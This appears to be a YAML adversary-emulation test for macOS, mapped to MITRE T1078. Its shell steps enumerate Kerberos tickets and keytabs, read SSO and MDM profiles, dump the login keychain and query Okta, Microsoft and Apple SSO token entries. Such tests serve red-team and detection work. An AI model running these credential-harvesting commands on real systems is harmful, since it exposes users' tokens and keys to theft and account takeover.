---
api_version: 2.0
uuid: 0bada7f4-3c6e-2f27-8d1e-0a5b8c8f2e4d
name: SSO Bypass
authors:
- Claude Code
description: |
  Enumerate and attempt to bypass Single Sign-On mechanisms on a macOS system.
  Inspects Kerberos tickets, checks for SAML/SSO configuration profiles, lists
  enrolled MDM profiles, and searches the Keychain for SSO token entries.
mitre:
  tactics:
  - TA0001 Initial Access
  techniques:
  - T1078 Valid Accounts
requirements:
  platforms:
  - os: darwin
steps:
- name: enumerate_kerberos_tickets
  description: Enumerate active Kerberos tickets on the system
  inline: |
    echo "=== Enumerating Kerberos Tickets ==="
    klist_output=$(klist 2>&1)
    klist_exit=$?
    echo "$klist_output"
    if [ $klist_exit -eq 0 ]; then
      echo ""
      echo "--- Kerberos ticket details ---"
      klist -e 2>&1 || true
      echo ""
      echo "--- Kerberos configuration ---"
      if [ -f /etc/krb5.conf ]; then
        echo "Kerberos config found at /etc/krb5.conf:"
        cat /etc/krb5.conf 2>/dev/null
      fi
      if [ -f "$HOME/Library/Preferences/edu.mit.Kerberos" ]; then
        echo "User Kerberos preferences found"
        cat "$HOME/Library/Preferences/edu.mit.Kerberos" 2>/dev/null
      fi
    else
      echo "No Kerberos credentials cache found or Kerberos not configured"
    fi
- name: check_sso_configuration
  description: Check for SAML/SSO configuration profiles on the system
  inline: |
    echo "=== Checking SSO Configuration ==="
    echo "--- Configuration Profiles ---"
    defaults read com.apple.preferences.configurationprofiles 2>&1 || echo "No configuration profiles preferences found"
    echo ""
    echo "--- Extensible SSO ---"
    defaults read com.apple.extensibleSSO 2>&1 || echo "No Extensible SSO configuration found"
    echo ""
    echo "--- Platform SSO ---"
    defaults read com.apple.PlatformSSO 2>&1 || echo "No Platform SSO configuration found"
    echo ""
    echo "--- Directory Services ---"
    dsconfigad -show 2>&1 || echo "Not bound to Active Directory"
    echo ""
    echo "--- LDAP Configuration ---"
    defaults read /Library/Preferences/com.apple.openldap 2>&1 || echo "No LDAP configuration found"
- name: list_mdm_profiles
  description: List enrolled MDM profiles that may contain SSO configurations
  inline: |
    echo "=== Listing MDM Profiles ==="
    profiles list 2>&1 || echo "Could not list profiles (may require elevated privileges)"
    echo ""
    echo "--- Installed profile details ---"
    profiles show 2>&1 || true
    echo ""
    echo "--- Enrollment profile ---"
    profiles status -type enrollment 2>&1 || true
    echo ""
    echo "--- Configuration profile payloads ---"
    find /var/db/ConfigurationProfiles -name "*.mobileconfig" -o -name "*.plist" 2>/dev/null | while read -r f; do
      echo "Profile file: $f"
      plutil -p "$f" 2>/dev/null | grep -iE "SSO|SAML|Kerberos|OAuth|Identity" | head -5 || true
    done
- name: search_keychain_sso_tokens
  description: Search the macOS Keychain for SSO and identity token entries
  inline: |
    echo "=== Searching Keychain for SSO Tokens ==="
    sso_services=("com.apple.sso" "com.apple.extensibleSSO" "com.apple.PlatformSSO" "com.apple.idms" "com.apple.idms.appleid" "com.microsoft.identity" "com.microsoft.adalcache" "com.okta.token" "com.onelogin" "com.pingidentity")
    for svc in "${sso_services[@]}"; do
      result=$(security find-generic-password -s "$svc" 2>&1)
      if ! echo "$result" | grep -q "could not be found"; then
        echo "FINDING: SSO entry found for service: $svc"
        echo "$result" | grep -E "svce|acct|type|cdat|mdat" | head -5
      fi
    done
    echo ""
    echo "--- Keychain entries with identity/SSO references ---"
    security dump-keychain login.keychain-db 2>&1 | grep -iB3 "sso\|saml\|kerberos\|identity\|idp\|federation" | head -50 || echo "No SSO-related keychain entries found"
    echo ""
    echo "--- Checking for Kerberos keytab files ---"
    find / -name "*.keytab" -type f 2>/dev/null | head -5 | while read -r f; do
      echo "FINDING: Keytab file found: $f"
      ls -la "$f"
    done
    if [ -f /etc/krb5.keytab ]; then
      echo "FINDING: System keytab found at /etc/krb5.keytab"
      klist -k /etc/krb5.keytab 2>&1 || true
    fi
  cleanup:
    inline: |
      echo "SSO bypass enumeration complete. No temporary files to clean up."
tests:
- name: dry_run_test
  dry_run: true
